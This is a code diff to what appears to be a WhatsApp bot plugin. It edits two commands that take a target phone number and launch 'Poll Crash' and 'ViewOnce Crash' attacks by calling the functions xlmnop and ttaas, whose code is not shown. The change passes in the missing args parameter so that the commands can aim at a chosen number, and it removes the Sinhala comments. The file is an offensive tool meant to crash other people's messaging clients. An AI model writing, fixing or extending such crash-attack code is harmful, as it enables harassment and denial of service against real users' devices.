@@ -8,17 +8,11 @@ cmd({
     category: "tools",
     filename: __filename
 },
-async (conn, mek, m, { from, pushname, sender, reply }) => {
+async (conn, mek, m, { from, pushname, sender, reply, args }) => {
     try {
-        // Target number එක ගන්නවා
         const target = args[0] ? args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net' : from;
-        
-        // Confirmation message එක
         await reply(`🔥 *POLL CRASH ATTACK INITIATED* 🔥\n\nTarget: ${target}\nMethod: Poll Crash\nStatus: Processing...`);
-        
-        // Poll crash function එක execute කරනවා
         await xlmnop(target);
-        
         await reply(`✅ *POLL CRASH ATTACK COMPLETED* ✅\n\nTarget: ${target}\nStatus: Success!`);
     } catch (error) {
         console.error(error);
@@ -33,17 +27,11 @@ cmd({
     category: "tools",
     filename: __filename
 },
-async (conn, mek, m, { from, pushname, sender, reply }) => {
+async (conn, mek, m, { from, pushname, sender, reply, args }) => {
     try {
-        // Target number එක ගන්නවා
         const target = args[0] ? args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net' : from;
-        
-        // Confirmation message එක
         await reply(`🔥 *VIEWONCE CRASH ATTACK INITIATED* 🔥\n\nTarget: ${target}\nMethod: ViewOnce Crash\nStatus: Processing...`);
-        
-        // ViewOnce crash function එක execute කරනවා
         await ttaas(target);
-        
         await reply(`✅ *VIEWONCE CRASH ATTACK COMPLETED* ✅\n\nTarget: ${target}\nStatus: Success!`);
     } catch (error) {
         console.error(error);
